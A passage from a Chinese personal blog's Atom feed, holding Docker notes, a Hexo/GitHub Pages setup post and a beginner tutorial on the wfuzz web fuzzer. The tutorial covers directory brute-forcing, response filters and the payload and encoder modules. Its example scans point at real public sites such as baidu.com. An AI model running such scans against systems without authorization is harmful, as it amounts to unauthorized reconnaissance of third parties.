class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker logs [OPTIONS] CONTAINER</span><br><span class="line">Options:</span><br><span class="line">        --details        显示更多的信息</span><br><span class="line">    -f, --follow         跟踪实时日志</span><br><span class="line">        --since string   显示自某个timestamp之后的日志，或相对时间，如42m（即42分钟）</span><br><span class="line">        --tail string    从日志末尾显示多少行日志， 默认是all</span><br><span class="line">    -t, --timestamps     显示时间戳</span><br><span class="line">        --until string   显示自某个timestamp之前的日志，或相对时间，如42m（即42分钟）</span><br></pre></td></tr></table></figure><br><h4><span id="2-配置没问题访问搭建的nginx不成功">2. 配置没问题，访问搭建的nginx不成功</span></h4><p>错误原因：</p><p>重启下dockers<br>systemctl restart docker<br>重启容器<br>docker restart [name]</p><p>再次访问<br>success！</p><br><br><br><br><hr><hr><br><h2><span id="进入docker-方法">进入docker 方法</span></h2><ul><li><p><strong>exec</strong><br><code>docker exec [names] bash</code></p></li><li><p><strong>nsenter</strong></p></li></ul><p>1 . 查看容器[id]的进程的PID<br><code>docker inspect -f \{\{.State.Pid\}\} [CONTAINER ID]</code></p><p>2 . 使用pid进入容器<br><code>nsenter --target $PID --mount --uts --ipc --net --pid</code><br>$PID为第一步查询到的PID</p><p><a href="https://blog.csdn.net/qq_39629343/article/details/80170164" target="_blank" rel="noopener">about nsenter install</a></p><br><h2><span id="docker卸载">docker卸载</span></h2><p>查看已安装的包<br><code>yum list installed | grep docker</code></p><p>删除包<br><code>yum -y remove docker-engine.x86_64</code></p><hr><p>推荐两个doker 搭建<a href="https://www.runoob.com/docker/docker-install-nginx.html" target="_blank" rel="noopener">nginx</a>、<a href="https://www.runoob.com/docker/docker-install-php.html" target="_blank" rel="noopener">php</a> 、mysql 的文章</p><p>参考：<a href="https://blog.51cto.com/11134648/2160257" target="_blank" rel="noopener">https://blog.51cto.com/11134648/2160257</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;br&gt;好久没更新博客了，感觉每天都在虚度光阴，要给自己指定一个学习计划，让自己忙起来！！&lt;br&gt;记一下最近刚接触的doker吧，把笔记知识点汇总一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://unixcs.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>about blog</title>
    <link href="http://unixcs.com//article/2019-06-01/1/"/>
    <id>http://unixcs.com//article/2019-06-01/1/</id>
    <published>2019-06-01T05:15:17.000Z</published>
    <updated>2019-06-02T08:57:19.210Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="0x00">0x00</span></h2><p><strong>前言</strong><br>this is my first blog<br>昨天花了一天时间终于把这个博客开通了，俗话说前人栽树后人乘凉，多亏了一些前辈分享的一些博客，才能这么快上手。不过在这中间还是遇到了许多的坑，可能这些小问题在大佬们看来都不屑去写，但是对于萌新的我来说，这些东西还是要慢慢的去摸索。话不多说，开始填坑。</p> <a id="more"></a> <h2><span id="0x01">0x01</span></h2><p><strong>首先介绍下博客的环境</strong><br><code>github+hexo+node.js</code> (我使用的是win)</p><p><strong>搭建过程</strong><br>前期搭建的具体过程我就不一一叙述了，网上的例子很多，这里贴两个我搭建过程中参考的文章。</p><ul><li><a href="https://www.cnblogs.com/jackyroc/p/7681938.html" target="_blank" rel="noopener">case1</a></li><li><a href="http://fangzh.top/2018/2018090514/" target="_blank" rel="noopener">case2</a></li></ul><h2><span id="0x02">0x02</span></h2><p>简单的记一下一些错误</p><h4><span id="1找不到-ssh">1.找不到 .ssh</span></h4><p><code>cd ~/.ssh</code></p><p><del>？？黑人问号？？ 百度了N遍都没讲到点子上，最后终于在一个老哥的CSDN的文章里找到了解决办法，这里记录一下</del></p><p><strong>解决方法：</strong><br>这里其实就是因为我们是第一次使用，~目录里缺少 .ssh文件夹<br>这时候我们该干嘛？  当然是去<strong>创建一个.ssh文件夹！</strong> </p><p>打开 Git Bash，输入如下命令，然后连续按三个回车即可：<br><code>ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</code><br>然后会出来提示Enter file in which to save the key<br>后面是一个路径，你就会找到你想要的.ssh文件夹了，去电脑里找吧。</p><h4><span id="2所有文章功能缺失">2.所有文章功能缺失</span></h4><p><strong>解决方法：</strong></p><p>在根目录_config.yml配置文件的最后插入以下代码</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jsonContent:</span></span><br><span class="line"><span class="attr">    meta:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">    pages:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">    posts:</span></span><br><span class="line"><span class="attr">      title:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">      date:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">      path:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">      text:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">      raw:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">      content:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">      slug:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">      updated:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">      comments:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">      link:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">      permalink:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">      excerpt:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">      categories:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">      tags:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h1><span id="0x03">0x03</span></h1><hr><p><strong>域名</strong></p><p>主要流程：</p><p><strong>购买域名 -&gt; 实名认证 -&gt; 域名解析 -&gt; githubpage绑定域名</strong></p><p>前两步没啥好说的，这里主要介绍下后面两步</p><hr><ul><li><p>域名解析里 添加 A 记录 指向以下任意ip</p><blockquote><p>185.199.108.153<br>185.199.109.153<br>185.199.110.153<br>185.199.111.153</p></blockquote></li><li><p>source目录里新建一个文件 <strong>CNAME</strong><br><code>echo unixcs.com</code><br><code>echo www.unixcs.com</code></p></li><li><p>去github库里 添加一个自定义域名</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;br&gt;this is my first blog&lt;br&gt;昨天花了一天时间终于把这个博客开通了，俗话说前人栽树后人乘凉，多亏了一些前辈分享的一些博客，才能这么快上手。不过在这中间还是遇到了许多的坑，可能这些小问题在大佬们看来都不屑去写，但是对于萌新的我来说，这些东西还是要慢慢的去摸索。话不多说，开始填坑。&lt;/p&gt;
    
    </summary>
    
    
      <category term="blog" scheme="http://unixcs.com/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="http://unixcs.com//article/2019-05-31/1/"/>
    <id>http://unixcs.com//article/2019-05-31/1/</id>
    <published>2019-05-31T14:40:31.000Z</published>
    <updated>2019-06-01T07:34:38.117Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="测试">测试</span></h1><h2><span id="测试测试">测试测试</span></h2><ul><li><code>hey!hey!hey!</code></li></ul><p><code>hey!hey!hey!</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;测试&quot;&gt;测试&lt;/span&gt;&lt;/h1&gt;&lt;h2&gt;&lt;span id=&quot;测试测试&quot;&gt;测试测试&lt;/span&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;hey!hey!hey!&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;hey!hey!hey!&lt;/cod
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Wfuzz初上手</title>
    <link href="http://unixcs.com//article/2018-10-28/1/"/>
    <id>http://unixcs.com//article/2018-10-28/1/</id>
    <published>2018-10-27T16:00:00.000Z</published>
    <updated>2019-08-01T16:23:47.686Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="wfuzz初上手">Wfuzz初上手</span></h1><h2><span id="wfuzz是啥玩意">Wfuzz是啥玩意？</span></h2><p>wfuzz 是一款Python开发的Web安全模糊测试工具。<a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><a id="more"></a><p>简单粗暴的功能特点记录：</p><ol><li>模块化 框架 可编写插件</li><li>接口 可处理BurpSuite所抓的请求和响应报文</li></ol><p>简而言之就是wfuzz可以用在做<strong>请求参数参数类的模糊测试</strong>，也可以用来做<strong>Web目录扫描</strong>等操作。</p><h2><span id="wfuzz初体验">Wfuzz初体验</span></h2><ul><li>安装Wfuzz <code>pip install wfuzz</code></li></ul><h3><span id="简单的使用">简单的使用</span></h3><blockquote><p>wfuzz -w 字典 地址(e.g. <a href="https://gh0st.cn/FUZZ" target="_blank" rel="noopener">https://gh0st.cn/FUZZ</a>)</p></blockquote><p>如上命令使用-w参数指定字典位置，然后跟上一个要测试的地址，所列的例子<code>https://gh0st.cn/FUZZ</code>中有一个<strong>FUZZ</strong>单词，这个单词可以理解是一个占位符，这样就大概了解了wfuzz的基本运行原理，它会读取字典然后传入占位符进行模糊测试请求。</p><p>实际的使用一遍：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w test_dict.txt https://gh0st.cn/FUZZ</span><br></pre></td></tr></table></figure><p>返回结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.11 - The Web Fuzzer                        *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: https://gh0st.cn/FUZZ</span><br><span class="line">Total requests: 6</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">IDResponse   Lines      Word         Chars          Payload</span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000004:  C=404      1 L     121 W   1636 Ch  "test123"</span><br><span class="line">000003:  C=404      1 L     121 W   1636 Ch  "456"</span><br><span class="line">000006:  C=404      1 L     121 W   1636 Ch  "admin123"</span><br><span class="line">000005:  C=404      1 L     121 W   1636 Ch  "admin"</span><br><span class="line">000001:  C=404      1 L     121 W   1636 Ch  "abc"</span><br><span class="line">000002:  C=404      1 L     121 W   1636 Ch  "123"</span><br><span class="line"></span><br><span class="line">Total time: 2.122055</span><br><span class="line">Processed Requests: 6</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 2.827447</span><br></pre></td></tr></table></figure><p>通过返回结果我们可以知道很多信息，最需要关注的就是<code>ID、Response、 Lines、Word、Chars、Payload</code>这一行，从左往右看，依次是<strong>编号、响应状态码、响应报文行数、响应报文字数、响应报文正字符数、测试使用的Payload</strong>。</p><h3><span id="了解wfuzz">了解Wfuzz</span></h3><p>通过<code>-h</code>或者<code>--help</code>可以来获取帮助信息。</p><h4><span id="wfuzz模块">Wfuzz模块</span></h4><p>如上所述说到wfuzz是模块化的框架，wfuzz默认自带很多模块，模块分为5种类型分别是：<code>payloads</code>、<code>encoders</code>、<code>iterators</code>、<code>printers</code>和<code>scripts</code>。</p><p>通过<code>-e</code>参数可以查看指定模块类型中的模块列表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -e payloads</span><br></pre></td></tr></table></figure><p><code>payloads</code>类的模块列表如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Available payloads:</span><br><span class="line"></span><br><span class="line">  Name            | Summary</span><br><span class="line">------------------------------------------------------------------------------------------------------</span><br><span class="line">  guitab          | This payload reads requests from a tab in the GUI</span><br><span class="line">  dirwalk         | Returns filename's recursively from a local directory.</span><br><span class="line">  file            | Returns each word from a file.</span><br><span class="line">  burpstate       | Returns fuzz results from a Burp state.</span><br><span class="line">  wfuzzp          | Returns fuzz results' URL from a previous stored wfuzz session.</span><br><span class="line">  ipnet           | Returns list of IP addresses of a network.</span><br><span class="line">  bing            | Returns URL results of a given bing API search (needs api key).</span><br><span class="line">  stdin           | Returns each item read from stdin.</span><br><span class="line">  list            | Returns each element of the given word list separated by -.</span><br><span class="line">  hexrand         | Returns random hex numbers from the given range.</span><br><span class="line">  range           | Returns each number of the given range.</span><br><span class="line">  names           | Returns possible usernames by mixing the given words, separated by -, using know</span><br><span class="line">                  | n typical constructions.</span><br><span class="line">  hexrange        | Returns each hex number of the given hex range.</span><br><span class="line">  permutation     | Returns permutations of the given charset and length.</span><br><span class="line">  buffer_overflow | Returns a string using the following pattern A * given number.</span><br><span class="line">  iprange         | Returns list of IP addresses of a given IP range.</span><br><span class="line">  burplog         | Returns fuzz results from a Burp log.</span><br><span class="line">  autorize        | Returns fuzz results' from autororize.</span><br></pre></td></tr></table></figure><h3><span id="wfuzz使用">Wfuzz使用</span></h3><p>从上文知道了wfuzz基于一个非常简单的概念：使用payload来替换相应的FUZZ关键词的位置，FUZZ这样的关键词就是<code>占位符</code>，payload就是输入源。</p><p>通过<code>wfuzz -e payloads</code>可以获取payloads类的所有模块列表，使用<code>wfuzz -z help</code>可以获取关于payloads类模块的详细信息，也可以通过<code>--slice</code>参数来过滤返回信息的结果。</p><p>e.g. <code>wfuzz -z help --slice &quot;names&quot;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Name: names 0.1</span><br><span class="line">Categories: default</span><br><span class="line">Summary: Returns possible usernames by mixing the given words, separated by -, using known typical constructions.</span><br><span class="line">Author: Christian Martorella,Adapted to newer versions Xavi Mendez (@xmendez)</span><br><span class="line">Description:</span><br><span class="line">   ie. jon-smith</span><br><span class="line">Parameters:</span><br><span class="line">   + name: Name and surname in the form of name-surname.</span><br></pre></td></tr></table></figure><h4><span id="使用字典">使用（字典）</span></h4><p>注：命令中的wordlist表示为字典位置</p><ol><li><p><code>wfuzz -z file --zP fn=wordlist URL/FUZZ</code></p></li><li><p><code>wfuzz -z file,wordlist URL/FUZZ</code></p></li><li><p><code>wfuzz -w wordlist URL/FUZZ</code></p></li></ol><p>这里有必要说明下，使用命令意义是一样的，都是使用<code>payloads</code>模块类中的<code>file</code>模块，通过<code>wfuzz -z help --slice &quot;file&quot;</code>看如何使用<code>file</code>模块：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Name: file 0.1</span><br><span class="line">Categories: default</span><br><span class="line">Summary: Returns each word from a file.</span><br><span class="line">Author: Carlos del Ojo,Christian Martorella,Adapted to newer versions Xavi Mendez (@xmendez)</span><br><span class="line">Description:</span><br><span class="line">   Returns the contents of a dictionary file line by line.</span><br><span class="line">Parameters:</span><br><span class="line">   + fn: Filename of a valid dictionary</span><br></pre></td></tr></table></figure><p>通过返回的帮助信息，我们知道这个模块需要一个<strong>参数fn</strong>，这个参数值为字典文件名（绝对路径）。这样子第一条命令一下子就明白了，<code>wfuzz -z file --zP fn=wordlist URL/FUZZ</code>中的<code>-z file</code>使用模块，<code>--zP fn=wordlist</code>是定义<strong>fn参数</strong>的值（可以这样理解，–zP 这里的P大写代表 Parameters ，然后其他的都是固有个事）</p><p>第二条命令简写了第一条命令的赋值，第三条命令使用<code>-w</code>，这个参数就是<code>-z file --zP fn</code>的别名。</p><p><strong>多个字典</strong></p><p>使用<code>-z</code> 或<code>-w</code> 参数可以同时指定多个字典，这时相应的占位符应设置为 <strong>FUZZ,FUZ2Z,FUZ3Z,….,FUZnZ</strong>, 其中<code>n</code>代表了占位序号。</p><p>例如想要同时爆破目录、文件名、后缀，可以这样来玩：</p><p><code>wfuzz -w 目录字典路径 -w 文件名字典路径 -w 后缀名字典路径 URL/FUZZ/FUZ2Z.FUZ3Z</code></p><h4><span id="过滤器">过滤器</span></h4><p>wfuzz具有过滤器功能，在做测试的过程中会因为环境的问题需要进行过滤，例如在做目录扫描的时候，你事先探测并知道了这个网站访问不存在目录的时候使用的是自定义404页面（也就是状态码为200），而你可以选择提取该自定义页面的特征来过滤这些返回结果。</p><p>wfuzz过滤分为两种方法：<strong>隐藏符合过滤条件的结果</strong> 和 <strong>显示符合过滤条件的结果</strong></p><p><strong>隐藏响应结果</strong></p><p>通过<code>--hc</code>，<code>--hl</code>，<code>--hw</code>，<code>--hh</code>参数可以隐藏某些HTTP响应。</p><ul><li><code>--hc</code> 根据响应报文状态码进行隐藏（hide code）</li></ul><p>隐藏404：</p><p><code>wfuzz -w wordlist --hc 404 URL/FUZZ</code></p><p>隐藏404、403：</p><p><code>wfuzz -w wordlist --hc 404,403 URL/FUZZ</code></p><p>e.g. 使用百度举个例子，运行<code>wfuzz -w test_dict.txt https://www.baidu.com/FUZZ</code>结果如下</p><p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-10-28/0x00.png" alt="0x00"></p><p>这里所有的测试请求，都是不存在的页面，那么百度的404页面规则就是如上图结果所示：<strong>响应报文状态码（302）、响应报文行数（7）、响应报文字数（18）、响应报文字符数（222）</strong>，那么下面的就是填空题了～</p><ul><li><code>--hl</code>根据响应报文行数进行隐藏（hide lines）</li></ul><p><code>wfuzz -w wordlist --hl 7 https://www.baidu.com/FUZZ</code></p><ul><li><code>--hw</code>根据响应报文字数进行隐藏（hide word）</li></ul><p><code>wfuzz -w wordlist --hw 18 https://www.baidu.com/FUZZ</code></p><ul><li><code>--hh</code>根据响应报文字符数进行隐藏（hide chars 这里因为code和chars首字母都是c，–hc参数已经有了，所以hide chars的参数就变成了–hh）</li></ul><p><code>wfuzz -w wordlist --hh 222 https://www.baidu.com/FUZZ</code></p><p>如果根据单个条件判断相对来说肯定是不精确的，所以整合一下就是这样的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w wordlist --hc 302 --hl 7 --hw 18 --hh 222 https://www.baidu.com/FUZZ</span><br></pre></td></tr></table></figure><p>这样就可以对<code>https://www.baidu.com/</code>进行目录扫描咯～</p><p><strong>显示响应结果</strong></p><p>显示响应结果的使用方法跟隐藏时的原理一样，只不过参数变为了：<code>--sc</code>（show code），<code>--sl</code>（show lines），<code>--sw</code>（show word），<code>--sh</code> （show chars）。</p><p><strong>使用Baseline(基准线)</strong></p><p>过滤器可以是某个HTTP响应的引用，这样的引用我们称为Baseline。</p><p>之前的使用<code>--hh</code>进行过滤的例子中，还可以使用下面的命令代替：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w wordlist --hh BBB https://www.baidu.com/FUZZ&#123;404there&#125;</span><br></pre></td></tr></table></figure><p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-10-28/0x01.png" alt="0x01"></p><p>这条命令的意思应该很容易理解，首先要清楚基准线是什么？换个名字：标准线 or 及格线。</p><p>首先解释下<code>https://www.baidu.com/FUZZ{404there}</code>的意思，这里代表wfuzz第一个请求是请求<code>https://www.baidu.com/404there</code>这个网址，在<code>{ }</code>内的值用来指定wfuzz第一个请求中的FUZZ占位符，而这第一个请求被标记为BBB（<strong>BBB不能换成别的</strong>）基准线；其次这里使用的参数是<code>--hh</code>，<strong>也就是以BBB这条请求中的Chars为基准，其他请求的Chars值与BBB相同则隐藏</strong>。</p><p><strong>使用正则表达式过滤</strong></p><p>wfuzz参数<code>--ss</code>和<code>--hs</code>可以使用正则表达式来对返回的结果过滤。</p><p>e.g. 在这里一个网站自定义返回页面的内容中包含<code>Not Found</code>，想根据这个内容进行过滤可以使用如下的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w wordlist --hs "Not Found" http://127.0.0.1/FUZZ</span><br></pre></td></tr></table></figure><p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-10-28/0x02.png" alt="0x02"></p><p>得出结论使用方法：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">wfuzz </span>-w <span class="string">wordlist </span><span class="built_in">--hs</span> 正则表达式 <span class="string">URL/</span><span class="string">FUZZ </span><span class="comment">#隐藏</span></span><br><span class="line"><span class="string">wfuzz </span>-w <span class="string">wordlist </span><span class="built_in">--ss</span> 正则表达式 <span class="string">URL/</span><span class="string">FUZZ </span><span class="comment">#显示</span></span><br></pre></td></tr></table></figure><h2><span id="手册">手册</span></h2><p>原文来自：DigApis安全 m0nst3r</p><h3><span id="模块种类">模块种类</span></h3><h4><span id="payload">payload</span></h4><p>payload为wfuzz生成的用于测试的特定字符串，一般情况下，会替代被测试URL中的FUZZ占位符。<br>当前版本中的wfuzz中可用payloads列表如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Available payloads:</span><br><span class="line">  Name            | Summary                                                                           </span><br><span class="line">------------------------------------------------------------------------------------------------------</span><br><span class="line">  guitab          | 从可视化的标签栏中读取请求                                </span><br><span class="line">  dirwalk         | 递归获得本地某个文件夹中的文件名                            </span><br><span class="line">  file            | 获取一个文件当中的每个词                                                    </span><br><span class="line">  autorize        | 获取autorize的测试结果Returns fuzz results' from autororize.                                            </span><br><span class="line">  wfuzzp          | 从之前保存的wfuzz会话中获取测试结果的URL                   </span><br><span class="line">  ipnet           | 获得一个指定网络的IP地址列表                                        </span><br><span class="line">  bing            | 获得一个使用bing API搜索的URL列表 (需要 api key).                   </span><br><span class="line">  stdin           | 获得从标准输入中的条目                                                </span><br><span class="line">  list            | 获得一个列表中的每一个元素，列表用以 - 符号分格                       </span><br><span class="line">  hexrand         | 从一个指定的范围中随机获取一个hex值                                  </span><br><span class="line">  range           | 获得指定范围内的每一个数值                                          </span><br><span class="line">  names           | 从一个以 - 分隔的列表中，获取以组合方式生成的所有usernames值</span><br><span class="line">  burplog         | 从BurpSuite的记录中获得测试结果                                             </span><br><span class="line">  permutation     | 获得一个在指定charset和length时的字符组合                             </span><br><span class="line">  buffer_overflow | 获得一个包含指定个数个A的字符串.                    </span><br><span class="line">  hexrange        | 获得指定范围内的每一个hex值                                   </span><br><span class="line">  iprange         | 获得指定IP范围内的IP地址列表                                 </span><br><span class="line">  burpstate       | 从BurpSuite的状态下获得测试结果</span><br></pre></td></tr></table></figure><h4><span id="encoder">encoder</span></h4><p>encoder的作用是将payload进行编码或加密。<br>wfuzz的encoder列表如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Available encoders:</span><br><span class="line">  Category      | Name                      | Summary                                                                           </span><br><span class="line">------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">  url_safe, url | urlencode                 | 用`%xx`的方式替换特殊字符， 字母/数字/下划线/半角点/减号不替换</span><br><span class="line">  url_safe, url | double urlencode             | 用`%25xx`的方式替换特殊字符， 字母/数字/下划线/半角点/减号不替换</span><br><span class="line">  url              | uri_double_hex            | 用`%25xx`的方式将所有字符进行编码</span><br><span class="line">  html          | html_escape                | 将`&amp;`，`&lt;`，`&gt;`转换为HTML安全的字符</span><br><span class="line">  html            | html_hexadecimal             | 用 `&amp;#xx;` 的方式替换所有字符</span><br><span class="line">  hashes         | base64                    | 将给定的字符串中的所有字符进行base64编码</span><br><span class="line">  url             | doble_nibble_hex             | 将所有字符以`%%dd%dd`格式进行编码</span><br><span class="line">  db             | mssql_char                | 将所有字符转换为MsSQL语法的`char(xx)`形式</span><br><span class="line">  url             | utf8                        | 将所有字符以`\u00xx` 格式进行编码</span><br><span class="line">  hashes         | md5                         | 将给定的字符串进行md5加密</span><br><span class="line">  default         | random_upper                | 将字符串中随机字符变为大写</span><br><span class="line">  url             | first_nibble_hex          | 将所有字符以`%%dd?` 格式进行编码</span><br><span class="line">  default         | hexlify                    | 每个数据的单个比特转换为两个比特表示的hex表示</span><br><span class="line">  url             | second_nibble_hex         | 将所有字符以`%?%dd` 格式进行编码</span><br><span class="line">  url             | uri_hex                     | 将所有字符以`%xx` 格式进行编码</span><br><span class="line">  default         | none                         | 不进行任何编码</span><br><span class="line">  hashes         | sha1                        | 将字符串进行sha1加密</span><br><span class="line">  url             | utf8_binary                | 将字符串中的所有字符以 `\uxx` 形式进行编码</span><br><span class="line">  url             | uri_triple_hex             | 将所有字符以`%25%xx%xx` 格式进行编码</span><br><span class="line">  url             | uri_unicode                | 将所有字符以`%u00xx` 格式进行编码</span><br><span class="line">  html             | html_decimal                | 将所有字符以 `&amp;#dd; ` 格式进行编码</span><br><span class="line">  db             | oracle_char                | 将所有字符转换为Oracle语法的`chr(xx)`形式</span><br><span class="line">  db             | mysql_char                 | 将所有字符转换为MySQL语法的`char(xx)`形式</span><br></pre></td></tr></table></figure><h4><span id="iterator">iterator</span></h4><p>wfuzz的iterator提供了针对多个payload的处理方式。<br>itorators的列表如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Available iterators:</span><br><span class="line"></span><br><span class="line">  Name    | Summary</span><br><span class="line">----------------------------------------------------------------------------------------------</span><br><span class="line">  product | Returns an iterator cartesian product of input iterables.</span><br><span class="line">  zip     | Returns an iterator that aggregates elements from each of the iterables.</span><br><span class="line">  chain   | Returns an iterator returns elements from the first iterable until it is exhaust</span><br><span class="line">          | ed, then proceeds to the next iterable, until all of the iterables are exhausted</span><br><span class="line">          | .</span><br></pre></td></tr></table></figure><h4><span id="printer">printer</span></h4><p>wfuzz的printers用于控制输出打印。<br>printers列表如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Available printers:</span><br><span class="line">  Name      | Summary                             </span><br><span class="line">--------------------------------------------------</span><br><span class="line">  raw       | `Raw` output format</span><br><span class="line">  json      | Results in `json` format</span><br><span class="line">  csv       | `CSV` printer ftw</span><br><span class="line">  magictree | Prints results in `magictree` format</span><br><span class="line">  html      | Prints results in `html` format</span><br></pre></td></tr></table></figure><h4><span id="scripts">scripts</span></h4><p>scripts列表如下：</p><figure class="highlight shell"><table><tr><td 